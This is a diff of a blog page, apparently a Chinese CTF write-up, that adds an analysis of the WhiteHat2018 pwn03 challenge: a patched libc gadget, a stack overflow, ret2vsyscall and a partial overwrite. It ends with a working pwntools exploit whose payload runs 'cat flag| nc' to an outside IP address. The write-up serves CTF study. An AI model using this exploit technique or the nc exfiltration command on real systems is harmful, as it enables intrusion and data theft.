@@ -81,7 +81,7 @@
 
         
 
-        <li>Reading time 4 min</li>
+        <li>Reading time 8 min</li>
     </ul>
 </aside>
 
@@ -267,12 +267,250 @@ success <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda<
     io<span style="color:#f92672">.</span>interactive()</code></pre></div>
 <h2 id="pwn02">Pwn02</h2>
 
-<p>tcache uaf</p>
+<p>tcache uaf off-by-one null</p>
 
 <h2 id="pwn03">Pwn03</h2>
 
-<p>ret2vsyscall; reverse shell</p>
+<p>这道题挺有意思, 程序给了一个二进制文件和共享库, <a href="https://github.com/0x01f/pwn_repo/tree/master/WhiteHat2018_pwn03">下载文件</a></p>
 
+<h3 id="题目分析-1">题目分析</h3>
+
+<p>程序开启了所有保护, 并且有意思的是给的 libc 也是 patch 过得, 找一下 BuildID 相同的 libc, 查看 patch 的内容</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">WhiteHat2018_pwn03 <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> file ~/libc-database/db/libc6_2.27-3ubuntu1_amd64.so 
+/home/m4x/libc-database/db/libc6_2.27-3ubuntu1_amd64.so: ELF <span style="color:#ae81ff">64</span>-bit LSB pie executable x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>GNU/Linux<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0, <span style="color:#66d9ef">for</span> GNU/Linux <span style="color:#ae81ff">3</span>.2.0, stripped
+WhiteHat2018_pwn03 <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> file ./libc-2.27.so 
+./libc-2.27.so: ELF <span style="color:#ae81ff">64</span>-bit LSB pie executable x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>GNU/Linux<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0, <span style="color:#66d9ef">for</span> GNU/Linux <span style="color:#ae81ff">3</span>.2.0, stripped
+WhiteHat2018_pwn03 <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> diff libc-2.27.so ~/libc-database/db/libc6_2.27-3ubuntu1_amd64.so
+二进制文件 libc-2.27.so 和 /home/m4x/libc-database/db/libc6_2.27-3ubuntu1_amd64.so 不同</code></pre></div>
+<p>这里我用的是 hexdiff
+<img src="http://ww1.sinaimg.cn/large/006AWYXBly1funfoxn9cwj30ql0qd0y4.jpg" alt="" /></p>
+
+<p>只有这一处是不同的, IDA 中可以看出此处的功能相当于 <code>add rsi 127; jmp system</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-assembly" data-lang="assembly">.text:000000000004F43A                 add     rdi, 7Fh
+.text:000000000004F43E                 jmp     short loc_4F45B
+
+.text:000000000004F45B loc_4F45B:                              ; CODE XREF: sub_4F360+DE↑j
+.text:000000000004F45B                 call    sub_4EEB0
+.text:000000000004F460                 test    eax, eax
+.text:000000000004F462                 setz    al
+.text:000000000004F465                 add     rsp, 8
+.text:000000000004F469                 movzx   eax, al
+.text:000000000004F46C                 retn
+
+__int64 __fastcall system(__int64 a1)
+{
+  __int64 result; // rax
+
+  if ( a1 )
+    result = sub_4EEB0();
+  else
+    result = (unsigned int)sub_4EEB0() == 0;
+  return result;
+}</code></pre></div>
+<p>暂时不知道这段 gadget 有什么用, 先看二进制程序, 发现在 echo 函数中存在漏洞</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">echo</span>()
+{
+  <span style="color:#66d9ef">int</span> v0; <span style="color:#75715e">// ST0C_4
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// [rsp+Ch] [rbp-E4h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">216</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-E0h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp+E8h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  v3 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
+  v0 <span style="color:#f92672">=</span> v1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>;
+  read(<span style="color:#ae81ff">0</span>, buf, v0);
+  printf(<span style="color:#e6db74">&#34;Echo machine: &#34;</span>, buf);
+  write(<span style="color:#ae81ff">1</span>, buf, v0);
+  close(<span style="color:#ae81ff">0</span>);
+  close(<span style="color:#ae81ff">1</span>);
+  strcpy(buf, deleteyourevilstring);
+}</code></pre></div>
+<p>根据调试, read 时的长度 v0 是根据我们的输入决定的, 那么这里就存在一个栈溢出的漏洞, 有意思的是这道题的 stdin 和 stdout 也被关闭了, 根据现有的情况, 基本上溢出也只能利用一次了</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-assembly" data-lang="assembly">.text:0000000000000EFE                 mov     rax, [rbp+var_8]
+.text:0000000000000F02                 xor     rax, fs:28h
+.text:0000000000000F0B                 jmp     short locret_F12
+.text:0000000000000F0D ; ---------------------------------------------------------------------------
+.text:0000000000000F0D                 call    ___stack_chk_fail
+.text:0000000000000F12 ; ---------------------------------------------------------------------------
+.text:0000000000000F12
+.text:0000000000000F12 locret_F12:                             ; CODE XREF: echo+A4↑j
+.text:0000000000000F12                 leave
+.text:0000000000000F13                 retn</code></pre></div>
+<p>查看 <code>call __stack_chk_fail</code> 附近的汇编, 发现虽然 checksec 检测有 canary, 但实际没起作用, 这样 canary 保护也就绕过了</p>
+
+<h4 id="step-1-1">Step 1:</h4>
+
+<p>我们先看一下在 echo 函数 ret 前寄存器和栈上的值</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-assembly" data-lang="assembly">pwndbg&gt; 
+0x000055f1e44c0f13 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
+ RAX  0xa54266585221bb65
+ RBX  0x0
+ RCX  0x7ff52b699910 ◂— mov    rdx, qword ptr [rsi]
+ RDX  0x676e6972747320
+ RDI  0x7ffd0eed2220 ◂— 0x676e6972747320 /* u&#39; string&#39; */
+ RSI  0x55f1e46c2020 ◂— 0x676e6972747320 /* u&#39; string&#39; */
+ R8   0xe
+ R9   0x0
+ R10  0x8
+ R11  0x7ff52b7923c0 ◂— loopne 0x7ff52b792436
+ R12  0x55f1e44c0b50 ◂— xor    ebp, ebp
+ R13  0x7ffd0eed24c0 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x6361616863616167 (&#39;gaachaac&#39;)
+ RSP  0x7ffd0eed22f8 —▸ 0x55f1e44c0f69 ◂— nop    
+ RIP  0x55f1e44c0f13 ◂— ret    
+───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
+   0x55f1e44c0efd    nop    
+   0x55f1e44c0efe    mov    rax, qword ptr [rbp - 8]
+   0x55f1e44c0f02    xor    rax, qword ptr fs:[0x28]
+   0x55f1e44c0f0b    jmp    0x55f1e44c0f12
+    ↓
+   0x55f1e44c0f12    leave  
+ ► 0x55f1e44c0f13    ret    &lt;0x55f1e44c0f69&gt;
+    ↓
+   0x55f1e44c0f69    nop    
+   0x55f1e44c0f6a    mov    rax, qword ptr [rbp - 8]
+   0x55f1e44c0f6e    xor    rax, qword ptr fs:[0x28]
+   0x55f1e44c0f77    je     0x55f1e44c0f7e
+    ↓
+   0x55f1e44c0f7e    leave  
+────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
+00:0000│ rsp  0x7ffd0eed22f8 —▸ 0x55f1e44c0f69 ◂— nop    
+01:0008│      0x7ffd0eed2300 ◂— 0x31 /* u&#39;1&#39; */
+02:0010│      0x7ffd0eed2308 ◂— 0x0
+... ↓
+pwndbg&gt; stack 25
+00:0000│ rsp  0x7ffd0eed22f8 —▸ 0x55f1e44c0f69 ◂— nop    
+01:0008│      0x7ffd0eed2300 ◂— 0x31 /* u&#39;1&#39; */
+02:0010│      0x7ffd0eed2308 ◂— 0x0
+... ↓
+0e:0070│      0x7ffd0eed2368 ◂— 0x7ff500000000
+0f:0078│      0x7ffd0eed2370 —▸ 0x55f1e44c1268 ◂— 0x63616d206f686345 (&#39;Echo mac&#39;)
+10:0080│      0x7ffd0eed2378 ◂— 0xc623073e3140da00
+11:0088│      0x7ffd0eed2380 ◂— 0x0
+12:0090│      0x7ffd0eed2388 —▸ 0x7ffd0eed23d0 —▸ 0x7ffd0eed23e0 —▸ 0x55f1e44c1060 ◂— push   r15
+13:0098│      0x7ffd0eed2390 —▸ 0x55f1e44c0b50 ◂— xor    ebp, ebp
+14:00a0│      0x7ffd0eed2398 —▸ 0x7ff52b632460 (system+32) ◂— test   eax, eax
+15:00a8│      0x7ffd0eed23a0 —▸ 0x7ffd0eed24c0 ◂— 0x1
+16:00b0│      0x7ffd0eed23a8 —▸ 0x55f1e44c0fef ◂— nop    
+17:00b8│      0x7ffd0eed23b0 ◂— 0x0
+18:00c0│      0x7ffd0eed23b8 ◂— 0x304e000000000000
+pwndbg&gt; telescope $rdi
+00:0000│ rdi  0x7ffd0eed2220 ◂— 0x676e6972747320 /* u&#39; string&#39; */
+01:0008│      0x7ffd0eed2228 ◂— 0x6161616861616167 (&#39;gaaahaaa&#39;)
+02:0010│      0x7ffd0eed2230 ◂— 0x6161616a61616169 (&#39;iaaajaaa&#39;)
+03:0018│      0x7ffd0eed2238 ◂— 0x6161616c6161616b (&#39;kaaalaaa&#39;)
+04:0020│      0x7ffd0eed2240 ◂— 0x6161616e6161616d (&#39;maaanaaa&#39;)
+05:0028│      0x7ffd0eed2248 ◂— 0x616161706161616f (&#39;oaaapaaa&#39;)
+06:0030│      0x7ffd0eed2250 ◂— 0x6161617261616171 (&#39;qaaaraaa&#39;)
+07:0038│      0x7ffd0eed2258 ◂— 0x6161617461616173 (&#39;saaataaa&#39;)
+pwndbg&gt; </code></pre></div>
+<p>有两点很有意思:
+1. rdi + 8 到之后的很长一段都是可控的
+2. 栈上有一个 system + 32 的地址
+这样再结合之前 libc 上的 gadget <code>add rdi, 127; jmp system</code>, 就可以通过 partial overwrite 改写 system + 32 的低位为 gadget 的地址(调试验证此时只需改写最低位即可, 是可行的), 这样如果能控制 rip 为此 gadget 的地址, 就相当于控制了 system 的参数, 有了一次执行命令的机会</p>
+
+<h4 id="step-2-1">Step 2:</h4>
+
+<p>但问题出在 system + 32 在 <code>rsp + 0xa0</code> 这个位置, 我们需要控制 echo 函数返回到这里, 这个也好办, 用 [ret2vsyscall]() 可以达到这个目的</p>
+
+<blockquote>
+<p>TLDR:
+  可以把 vsyscall 理解为一段固定地址和内容的 gadget, 用这段 gadget 填满栈, 可以实现 slide 的功能</p>
+</blockquote>
+
+<p>vsyscall 的地址可以直接用 vmmap 找到</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-assembly" data-lang="assembly">pwndbg&gt; vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+    0x55ef6a521000     0x55ef6a523000 r-xp     2000 0      /home/m4x/pwn_repo/WhiteHat2018_pwn03/onehit
+    0x55ef6a722000     0x55ef6a723000 r--p     1000 1000   /home/m4x/pwn_repo/WhiteHat2018_pwn03/onehit
+    0x55ef6a723000     0x55ef6a724000 rw-p     1000 2000   /home/m4x/pwn_repo/WhiteHat2018_pwn03/onehit
+    0x55ef6b8f7000     0x55ef6b918000 rw-p    21000 0      [heap]
+    0x7fe121ebd000     0x7fe1220a4000 r-xp   1e7000 0      /home/m4x/pwn_repo/WhiteHat2018_pwn03/libc-2.27.so
+    0x7fe1220a4000     0x7fe1222a4000 ---p   200000 1e7000 /home/m4x/pwn_repo/WhiteHat2018_pwn03/libc-2.27.so
+    0x7fe1222a4000     0x7fe1222a8000 r--p     4000 1e7000 /home/m4x/pwn_repo/WhiteHat2018_pwn03/libc-2.27.so
+    0x7fe1222a8000     0x7fe1222aa000 rw-p     2000 1eb000 /home/m4x/pwn_repo/WhiteHat2018_pwn03/libc-2.27.so
+    0x7fe1222aa000     0x7fe1222ae000 rw-p     4000 0      
+    0x7fe1222ae000     0x7fe1222d3000 r-xp    25000 0      /lib/x86_64-linux-gnu/ld-2.27.so
+    0x7fe1224d0000     0x7fe1224d2000 rw-p     2000 0      
+    0x7fe1224d2000     0x7fe1224d3000 r--p     1000 24000  /lib/x86_64-linux-gnu/ld-2.27.so
+    0x7fe1224d3000     0x7fe1224d4000 rw-p     1000 25000  /lib/x86_64-linux-gnu/ld-2.27.so
+    0x7fe1224d4000     0x7fe1224d5000 rw-p     1000 0      
+    0x7ffc925ca000     0x7ffc925eb000 rw-p    21000 0      [stack]
+    0x7ffc925ec000     0x7ffc925ef000 r--p     3000 0      [vvar]
+    0x7ffc925ef000     0x7ffc925f1000 r-xp     2000 0      [vdso]
+0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
+pwndbg&gt; x/5i 0xffffffffff600000
+   0xffffffffff600000:	mov    rax,0x60
+   0xffffffffff600007:	syscall 
+   0xffffffffff600009:	ret    
+   0xffffffffff60000a:	int3   
+   0xffffffffff60000b:	int3   </code></pre></div>
+<p>这样通过 ret2vsyscall + partial overwrite, 我们就能控制 system 执行一次指令了</p>
+
+<h4 id="step-3-1">Step 3:</h4>
+
+<p>还要注意的是, 程序的 stdout 被关掉了, 这个和 0ctf2018 的 babystack 类似, 可以使用 <code>cat flag| nc ip port</code> 的方式在公网 vps 上监听到(<code>nc -l -p port</code>)</p>
+
+<h4 id="exp-1">exp</h4>
+
+<p>最终的 exp 如下, 其中的一些细节调试一遍会更加清楚</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010"></span>WhiteHat2018_pwn03 [master<span style="color:#960050;background-color:#1e0010">●●</span>] cat solve<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> sha512
+<span style="color:#f92672">import</span> re
+context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./onehit&#34;</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;deepin-terminal&#34;</span>, <span style="color:#e6db74">&#34;-x&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>]
+
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./onehit&#34;</span>, env <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>: <span style="color:#e6db74">&#34;./libc-2.27.so&#34;</span>})
+<span style="color:#75715e">#  io = remote(&#34;localhost&#34;, 9999)</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">DEBUG</span>(bps <span style="color:#f92672">=</span> []):
+    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;set follow-fork-mode parent</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+    base <span style="color:#f92672">=</span> int(os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;pmap {}| awk &#39;{{print $1}}&#39;&#34;</span><span style="color:#f92672">.</span>format(io<span style="color:#f92672">.</span>pid))<span style="color:#f92672">.</span>readlines()[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
+    cmd <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74">&#39;b *{:#x}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(b <span style="color:#f92672">+</span> base) <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> bps])
+    cmd <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;c&#34;</span>
+
+    raw_input(<span style="color:#e6db74">&#34;DEBUG: &#34;</span>)
+    gdb<span style="color:#f92672">.</span>attach(io, cmd)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_interger</span>():
+    prefix, head <span style="color:#f92672">=</span>  re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#39;&#34;([A-Z]+)&#34;.*0x([0-9a-f]+)&#39;</span>, io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;The interger&#34;</span>))[<span style="color:#ae81ff">0</span>]
+    <span style="color:#75715e">#  print prefix, head</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x1fffff</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
+        <span style="color:#66d9ef">if</span> sha512(prefix <span style="color:#f92672">+</span> str(i))<span style="color:#f92672">.</span>hexdigest()<span style="color:#f92672">.</span>startswith(head):
+            <span style="color:#66d9ef">return</span> i
+    <span style="color:#66d9ef">else</span>:
+        log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;Not Found!!!&#34;</span>)
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34; = &#34;</span>, str(get_interger())<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>))
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;al?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;N0</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#75715e">#  DEBUG([0xEA0, 0xE7F])</span>
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)
+
+    <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">    .text:000000000004F43A                 add     rdi, 7Fh
+</span><span style="color:#e6db74">    .text:000000000004F43E                 jmp     short loc_4F45B
+</span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
+    vsyscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffff600000</span>
+    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cat flag| nc 123.207.141.87 9999 ;&#34;</span>
+    <span style="color:#75715e">#  cmd = &#34;/bin/sh &lt;&amp;2 &gt;&amp;2\0&#34;</span>
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x7f</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> cmd 
+    payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0xE0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">+</span> p64(vsyscall) <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x3a</span><span style="color:#e6db74">&#39;</span>
+
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;available</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, payload)
+    <span style="color:#75715e">#  pause()</span>
+
+    io<span style="color:#f92672">.</span>interactive()
+    io<span style="color:#f92672">.</span>close()</code></pre></div>
 
 </article>
 
